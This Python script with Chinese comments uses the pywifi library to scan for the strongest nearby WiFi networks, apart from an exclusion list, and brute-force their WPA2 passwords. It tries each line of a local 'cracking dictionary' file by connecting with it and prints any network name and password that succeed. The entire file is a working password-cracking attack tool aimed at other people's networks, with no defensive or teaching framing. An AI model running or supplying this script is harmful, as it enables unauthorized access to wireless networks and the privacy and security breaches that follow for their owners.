import pywifi #导入pywifi包
from pywifi import const  # 引用一些定义
import time

def getwifi(wifilist, wificount):
    wifi = pywifi.PyWiFi()  # 抓取网卡接口
    ifaces = wifi.interfaces()[0]  # 获取网卡
    ifaces.scan()
    time.sleep(5)
    bessis = ifaces.scan_results()
    allwifilist = []
    namelist = []
    ssidlist = []
    for data in bessis:
        if data.ssid not in namelist:  # 去掉重复的WIFI名称
            namelist.append(data.ssid)
            allwifilist.append((data.ssid, data.signal))
    sorted(allwifilist, key=lambda st: st[1], reverse=True)
    time.sleep(1)
    n = 0
    if len(allwifilist) is not 0:
        for item in allwifilist:
            if (item[0] not in ssidlist) & (item[0] not in wifilist):
                n = n + 1
                if n <= wificount:
                    ssidlist.append(item[0])
    print(allwifilist)
    return ssidlist


def getifaces():
    wifi = pywifi.PyWiFi()  # 抓取网卡接口
    ifaces = wifi.interfaces()[0]  # 获取网卡
    ifaces.disconnect()  # 断开无限网卡连接
    return ifaces

def testwifi(ifaces, ssidname, password):
    profile = pywifi.Profile()  # 创建wifi连接文件
    profile.ssid = ssidname  # 定义wifissid
    profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
    profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
    profile.key = password  # wifi密码
    ifaces.remove_all_network_profiles()  # 删除其他所有配置文件
    tmp_profile = ifaces.add_network_profile(profile)  # 加载配置文件
    ifaces.connect(tmp_profile)  # 连接wifi
    time.sleep(3)  # 5秒内能否连接上
    if ifaces.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False

def beginwork(wifinamelist):
    ifaces = getifaces()
    path = r"E:\Dictionaries\破解字典\123.txt"
    # path = r"中间是密码本放到位置"
    files = open(path, 'r')
    while True:
        try:
            password = files.readline()
            password = password.strip('\n')
            if not password:
                break
            for wifiname in wifinamelist:
                print("正在尝试：" + wifiname + "," + password)
                if testwifi(ifaces, wifiname, password):
                    print("Wifi账号:" + wifiname + "，Wifi密码:" + password)
                    wifinamelist.remove(wifiname)
                    break
            if not wifinamelist:
                break
        except:
            continue
    files.close()

if __name__ == '__main__':
    wifinames_e = ["", "Vrapile"]  # 排除不破解的wifi名字
    wifinames = getwifi(wifinames_e, 5)
    print(wifinames)
    beginwork(wifinames)